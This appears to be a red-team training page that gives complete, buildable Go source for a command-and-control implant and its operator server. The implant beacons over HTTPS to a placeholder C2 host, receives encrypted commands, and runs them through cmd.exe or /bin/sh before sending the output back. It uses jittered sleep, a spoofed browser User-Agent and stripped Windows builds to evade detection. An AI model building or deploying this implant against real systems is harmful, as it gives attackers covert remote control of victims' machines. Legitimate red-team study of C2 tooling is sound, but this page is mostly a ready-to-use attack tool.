---
layout: training-page
title: "Go C2 Implant Development — Red Team Academy"
module: "Tool Development"
tags:
  - go
  - golang
  - c2
  - implant
  - beacon
  - https
  - encryption
page_key: "tooldev-go-c2-implants"
render_with_liquid: false
---

# Go C2 Implant Development

## Overview

Go is ideal for C2 implant development: it compiles to a standalone binary for any OS/arch, has an excellent TLS/HTTP stack, and goroutines make concurrent operations trivial. This module builds a complete HTTPS beacon with AES-256-GCM encryption, configurable sleep jitter, command execution and output streaming, and a minimal server-side listener. These are the same primitives used in open-source C2 frameworks like Sliver and Merlin.

Go version: 1.22+. No external packages — everything uses the Go standard library.

## HTTPS Beacon Implant

The implant polls a C2 server over HTTPS using GET requests (check-in), receives commands in the encrypted response body, executes them, and POSTs results back. AES-256-GCM provides authenticated encryption — any tampering with the ciphertext is detected before execution. Jitter randomises sleep intervals to avoid regular heartbeat detection patterns.

```
// beacon.go — HTTPS polling beacon with AES-256-GCM encryption and sleep jitter.
// Build (Windows, stripped, no debug info):
//   GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o beacon.exe beacon.go
// Build (Linux):
//   go build -ldflags="-s -w" -o beacon beacon.go

package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"math/big"
	mathrand "math/rand"
	"net/http"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// ── Configuration (baked in at compile time) ──────────────────────────────────
const (
	C2URL    = "https://c2.example.com"    // C2 server base URL
	PSK      = "ChangeThisKey32BytesExact" // pre-shared key (must be exactly 32 chars)
	AgentUA  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	SleepSec = 60    // base sleep interval in seconds
	JitterPct = 0.3  // jitter: ±30% of SleepSec
)

// ── Derive AES-256 key from PSK ───────────────────────────────────────────────
// Using SHA-256 of the PSK — replace with HKDF for stronger key derivation.
func deriveKey() []byte {
	h := sha256.Sum256([]byte(PSK))
	return h[:]
}

// ── AES-256-GCM encrypt ───────────────────────────────────────────────────────
// Returns: base64( nonce(12 bytes) || ciphertext || auth_tag(16 bytes) )
// GCM mode provides authenticated encryption — integrity is guaranteed.
func encrypt(key, plaintext []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	// Generate a random 12-byte nonce (standard GCM nonce size)
	nonce := make([]byte, gcm.NonceSize())
	if _, err = rand.Read(nonce); err != nil {
		return "", err
	}
	// Seal appends: ciphertext + auth_tag after nonce
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

// ── AES-256-GCM decrypt ───────────────────────────────────────────────────────
// Input: base64-encoded nonce || ciphertext || auth_tag
// Returns error if authentication tag check fails (tampered/wrong key).
func decrypt(key []byte, encoded string) ([]byte, error) {
	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(data) < gcm.NonceSize() {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ct := data[:gcm.NonceSize()], data[gcm.NonceSize():]
	// Open decrypts and verifies the auth tag — returns error if tag mismatch
	return gcm.Open(nil, nonce, ct, nil)
}

// ── HTTP client with custom TLS (skip server cert verification) ───────────────
// In real ops: pin the server certificate fingerprint instead of skipping verification.
func newHTTPClient() *http.Client {
	tlsConf := &tls.Config{
		InsecureSkipVerify: true, // TODO: replace with cert pinning for real deployments
		MinVersion:         tls.VersionTLS12,
	}
	transport := &http.Transport{TLSClientConfig: tlsConf}
	return &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}
}

// ── Generate a unique agent ID from system info ───────────────────────────────
func agentID() string {
	h := sha256.Sum256([]byte(runtime.GOOS + runtime.GOARCH))
	return base64.StdEncoding.EncodeToString(h[:8]) // first 8 bytes as ID
}

// ── Execute a shell command ───────────────────────────────────────────────────
// Uses cmd.exe on Windows, /bin/sh on Linux/macOS.
func execCommand(cmd string) []byte {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	var command *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		command = exec.CommandContext(ctx, "cmd.exe", "/c", cmd)
	default:
		command = exec.CommandContext(ctx, "/bin/sh", "-c", cmd)
	}

	out, err := command.CombinedOutput()
	if err != nil && len(out) == 0 {
		return []byte(fmt.Sprintf("[error] %v", err))
	}
	return out
}

// ── Jittered sleep ───────────────────────────────────────────────────────────
// Sleeps for SleepSec ± JitterPct*SleepSec seconds.
// crypto/rand is used for the jitter value (avoids predictable patterns).
func sleepJitter() {
	base    := float64(SleepSec)
	maxOff  := base * JitterPct
	n, _   := rand.Int(rand.Reader, big.NewInt(int64(maxOff*1000)))
	offset  := float64(n.Int64()) / 1000.0
	// Randomly add or subtract the offset
	if mathrand.Intn(2) == 0 {
		offset = -offset
	}
	duration := time.Duration((base+offset)*1000) * time.Millisecond
	time.Sleep(duration)
}

// ── Main beacon loop ──────────────────────────────────────────────────────────
func main() {
	key    := deriveKey()
	client := newHTTPClient()
	id     := agentID()

	for {
		func() {
			// Check-in: GET /checkin?id=<agentID>
			req, err := http.NewRequest("GET", C2URL+"/checkin?id="+id, nil)
			if err != nil { return }
			req.Header.Set("User-Agent", AgentUA)

			resp, err := client.Do(req)
			if err != nil { return } // network error — retry next cycle
			defer resp.Body.Close()

			body, _ := io.ReadAll(resp.Body)
			encoded  := strings.TrimSpace(string(body))

			// Decrypt the response; "IDLE" means no task
			plaintext, err := decrypt(key, encoded)
			if err != nil { return }

			cmd := string(plaintext)
			if cmd == "IDLE" { return } // no work this cycle

			// Execute the command and collect output
			output   := execCommand(cmd)
			encOut, err := encrypt(key, output)
			if err != nil { return }

			// POST result back to /result?id=<agentID>
			postReq, _ := http.NewRequest("POST", C2URL+"/result?id="+id,
				bytes.NewBufferString(encOut))
			postReq.Header.Set("User-Agent", AgentUA)
			postReq.Header.Set("Content-Type", "text/plain")
			r, _ := client.Do(postReq)
			if r != nil { r.Body.Close() }
		}()

		sleepJitter() // wait before next check-in
	}
}
```

## C2 Server Listener (Go)

A minimal HTTPS server that receives beacon check-ins, queues tasks entered at the operator prompt, and collects results. Uses Go's built-in `net/http` server with a self-signed TLS certificate generated at startup.

```
// server.go — minimal HTTPS C2 listener for the beacon.go implant.
// Build: go build -o server server.go
// Usage: ./server -port 443 -cert server.crt -key server.key
//        (or use -autocert to generate a self-signed cert at startup)

package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

const PSK = "ChangeThisKey32BytesExact"

// ── Shared state ──────────────────────────────────────────────────────────────
var (
	mu          sync.Mutex
	taskQueues  = map[string][]string{}  // agentID -> pending tasks
	resultStore = map[string][]string{}  // agentID -> results
	seenAgents  = map[string]time.Time{} // agentID -> last seen time
)

func deriveKey() []byte {
	h := sha256.Sum256([]byte(PSK))
	return h[:]
}

func encryptGCM(key []byte, plaintext string) string {
	block, _ := aes.NewCipher(key)
	gcm, _   := cipher.NewGCM(block)
	nonce    := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	ct := gcm.Seal(nonce, nonce, []byte(plaintext), nil)
	return base64.StdEncoding.EncodeToString(ct)
}

func decryptGCM(key []byte, encoded string) (string, error) {
	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil { return "", err }
	block, _  := aes.NewCipher(key)
	gcm, _    := cipher.NewGCM(block)
	nonce, ct := data[:gcm.NonceSize()], data[gcm.NonceSize():]
	plain, err := gcm.Open(nil, nonce, ct, nil)
	return string(plain), err
}

// ── HTTP handlers ─────────────────────────────────────────────────────────────

// GET /checkin?id=AGENTID — return next queued task (encrypted) or IDLE
func checkinHandler(w http.ResponseWriter, r *http.Request) {
	key     := deriveKey()
	agentID := r.URL.Query().Get("id")

	mu.Lock()
	seenAgents[agentID] = time.Now()
	var task string
	if len(taskQueues[agentID]) > 0 {
		task = taskQueues[agentID][0]
		taskQueues[agentID] = taskQueues[agentID][1:]
	} else {
		task = "IDLE"
	}
	mu.Unlock()

	if task != "IDLE" {
		fmt.Fprintf(os.Stderr, "\n[*] Delivering task to %s: %s\n", agentID, task)
	}
	fmt.Fprint(w, encryptGCM(key, task))
}

// POST /result?id=AGENTID — receive and decrypt command output
func resultHandler(w http.ResponseWriter, r *http.Request) {
	key     := deriveKey()
	agentID := r.URL.Query().Get("id")
	body, _ := io.ReadAll(r.Body)

	output, err := decryptGCM(key, strings.TrimSpace(string(body)))
	if err != nil {
		http.Error(w, "decrypt error", 400)
		return
	}

	mu.Lock()
	resultStore[agentID] = append(resultStore[agentID], output)
	mu.Unlock()

	fmt.Fprintf(os.Stderr, "\n[OUTPUT from %s]\n%s\noperator> ", agentID, output)
	w.WriteHeader(200)
}

// ── Generate a self-signed ECDSA certificate ──────────────────────────────────
func selfSignedTLS() tls.Certificate {
	key, _  := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	tmpl := &x509.Certificate{
		SerialNumber: serial,
		Subject:      pkix.Name{CommonName: "localhost"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}
	certDER, _ := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	keyDER, _  := x509.MarshalECPrivateKey(key)
	cert, _ := tls.X509KeyPair(
		pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE",  Bytes: certDER}),
		pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER}),
	)
	return cert
}

// ── Operator CLI ──────────────────────────────────────────────────────────────
func operatorCLI() {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Fprint(os.Stderr, "operator> ")
		line, _ := reader.ReadString('\n')
		line = strings.TrimSpace(line)
		if line == "" { continue }

		switch {
		case line == "agents":
			mu.Lock()
			for id, t := range seenAgents {
				fmt.Printf("  %s (last seen: %s ago)\n", id, time.Since(t).Round(time.Second))
			}
			mu.Unlock()

		case strings.HasPrefix(line, "results "):
			id := strings.TrimPrefix(line, "results ")
			mu.Lock()
			for _, r := range resultStore[id] { fmt.Println(r) }
			mu.Unlock()

		default:
			// Format: <agentID> <command>
			parts := strings.SplitN(line, " ", 2)
			if len(parts) == 2 {
				mu.Lock()
				taskQueues[parts[0]] = append(taskQueues[parts[0]], parts[1])
				mu.Unlock()
				fmt.Printf("[*] Task queued for %s\n", parts[0])
			}
		}
	}
}

func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/checkin", checkinHandler)
	mux.HandleFunc("/result",  resultHandler)

	cert := selfSignedTLS()
	srv  := &http.Server{
		Addr:    ":443",
		Handler: mux,
		TLSConfig: &tls.Config{Certificates: []tls.Certificate{cert}},
	}

	fmt.Fprintln(os.Stderr, "[*] C2 server listening on :443 (HTTPS)")
	fmt.Fprintln(os.Stderr, "[*] Commands: 'agents', 'results <id>', '<id> <command>'")
	go operatorCLI()
	srv.ListenAndServeTLS("", "")
}
```
